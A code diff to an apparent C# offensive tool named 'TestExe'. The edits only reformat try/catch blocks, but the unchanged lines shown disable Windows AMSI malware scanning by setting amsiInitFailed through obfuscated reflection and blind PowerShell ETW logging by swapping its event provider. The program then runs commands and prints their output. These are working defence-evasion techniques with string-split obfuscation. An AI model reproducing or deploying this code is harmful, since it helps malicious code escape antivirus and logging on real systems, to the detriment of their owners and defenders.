@@ -22,18 +22,14 @@ namespace TestExe
             try
             {
                 mySpace.GetType().Assembly.GetType("Syste" + "m.Managem" + "ent.Autom" + "ation.AmsiU" + "tils").GetField("am" + "siInitF" + "ailed", BindingFlags.NonPublic | BindingFlags.Static).SetValue(null, true);
-            }
-            catch
-            {
+            }catch{
                 Console.WriteLine("[-] Maybe you needn't bypass.");
             }
 
             try
             {
                 mySpace.GetType().Assembly.GetType("System.Mana" + "gement.Au" + "tomation.Tr" + "acing.PSEtw" + "LogProvider").GetField("etwPro" + "vider", BindingFlags.NonPublic | BindingFlags.Static).SetValue(null, new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid()));
-            }
-            catch
-            {
+            }catch{
                 Console.WriteLine("[-] Maybe you needn't bypass ETW.");
             }
 
@@ -52,9 +48,7 @@ namespace TestExe
 
                 }
                 Console.WriteLine(sb.ToString());
-            }
-            catch
-            {
+            }catch{
                 Console.WriteLine("[-] something wrong with commands.");
             }
 
